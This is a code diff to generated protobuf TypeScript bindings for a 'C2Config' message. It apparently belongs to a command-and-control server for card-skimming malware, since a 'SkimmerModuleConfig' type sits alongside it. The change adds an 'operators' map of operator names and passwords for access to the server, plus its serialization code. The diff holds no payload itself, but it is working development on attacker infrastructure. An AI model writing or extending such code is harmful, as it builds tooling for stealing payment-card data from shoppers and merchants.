@@ -80,6 +80,14 @@ export interface C2Config {
      * @generated from protobuf field: bool debug = 10;
      */
     debug: boolean;
+    /**
+     * a map of <operator, password> with access to the server
+     *
+     * @generated from protobuf field: map<string, string> operators = 11;
+     */
+    operators: {
+        [key: string]: string;
+    };
 }
 /**
  * @generated from protobuf message c2.SkimmerModuleConfig
@@ -582,7 +590,8 @@ class C2Config$Type extends MessageType<C2Config> {
             { no: 6, name: "binary_route", kind: "scalar", T: 9 /*ScalarType.STRING*/ },
             { no: 8, name: "ts_ip", kind: "scalar", T: 9 /*ScalarType.STRING*/ },
             { no: 9, name: "ts_port", kind: "scalar", T: 13 /*ScalarType.UINT32*/ },
-            { no: 10, name: "debug", kind: "scalar", T: 8 /*ScalarType.BOOL*/ }
+            { no: 10, name: "debug", kind: "scalar", T: 8 /*ScalarType.BOOL*/ },
+            { no: 11, name: "operators", kind: "map", K: 9 /*ScalarType.STRING*/, V: { kind: "scalar", T: 9 /*ScalarType.STRING*/ } }
         ]);
     }
     create(value?: PartialMessage<C2Config>): C2Config {
@@ -597,6 +606,7 @@ class C2Config$Type extends MessageType<C2Config> {
         message.tsIp = "";
         message.tsPort = 0;
         message.debug = false;
+        message.operators = {};
         if (value !== undefined)
             reflectionMergePartial<C2Config>(this, message, value);
         return message;
@@ -636,6 +646,9 @@ class C2Config$Type extends MessageType<C2Config> {
                 case /* bool debug */ 10:
                     message.debug = reader.bool();
                     break;
+                case /* map<string, string> operators */ 11:
+                    this.binaryReadMap11(message.operators, reader, options);
+                    break;
                 default:
                     let u = options.readUnknownField;
                     if (u === "throw")
@@ -646,6 +659,22 @@ class C2Config$Type extends MessageType<C2Config> {
             }
         }
         return message;
+    }
+    private binaryReadMap11(map: C2Config["operators"], reader: IBinaryReader, options: BinaryReadOptions): void {
+        let len = reader.uint32(), end = reader.pos + len, key: keyof C2Config["operators"] | undefined, val: C2Config["operators"][any] | undefined;
+        while (reader.pos < end) {
+            let [fieldNo, wireType] = reader.tag();
+            switch (fieldNo) {
+                case 1:
+                    key = reader.string();
+                    break;
+                case 2:
+                    val = reader.string();
+                    break;
+                default: throw new globalThis.Error("unknown map entry field for field c2.C2Config.operators");
+            }
+        }
+        map[key ?? ""] = val ?? "";
     }
     internalBinaryWrite(message: C2Config, writer: IBinaryWriter, options: BinaryWriteOptions): IBinaryWriter {
         /* string domain = 1; */
@@ -678,6 +707,9 @@ class C2Config$Type extends MessageType<C2Config> {
         /* bool debug = 10; */
         if (message.debug !== false)
             writer.tag(10, WireType.Varint).bool(message.debug);
+        /* map<string, string> operators = 11; */
+        for (let k of globalThis.Object.keys(message.operators))
+            writer.tag(11, WireType.LengthDelimited).fork().tag(1, WireType.LengthDelimited).string(k).tag(2, WireType.LengthDelimited).string(message.operators[k]).join();
         let u = options.writeUnknownFields;
         if (u !== false)
             (u == true ? UnknownFieldHandler.onWrite : u)(this.typeName, message, writer);
